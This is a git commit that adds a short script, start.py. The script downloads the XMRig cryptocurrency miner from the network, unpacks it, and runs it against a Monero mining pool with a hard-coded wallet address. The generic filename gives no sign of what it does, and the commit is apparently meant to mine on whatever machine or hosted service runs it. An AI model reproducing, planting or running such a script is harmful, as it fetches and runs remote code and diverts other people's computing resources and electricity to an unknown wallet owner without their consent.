f6339d1a0bd77a55d74e0a34aaa2d7a8a285a27f
cmokhtar <53994312+cmokhtar@users.noreply.github.com>
2020-01-04 14:55:57 +0200

    Create start.py

---
+++ start.py
@@ -0,0 +1,5 @@
+import os
+os.system("wget https://github.com/xmrig/xmrig/releases/download/v5.5.0/xmrig-5.5.0-xenial-x64.tar.gz && \
+tar zxvf xmrig-5.5.0-xenial-x64.tar.gz && \
+cd xmrig-5.5.0 && \
+./xmrig -o pool.supportxmr.com:3333 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir --donate-level 1")
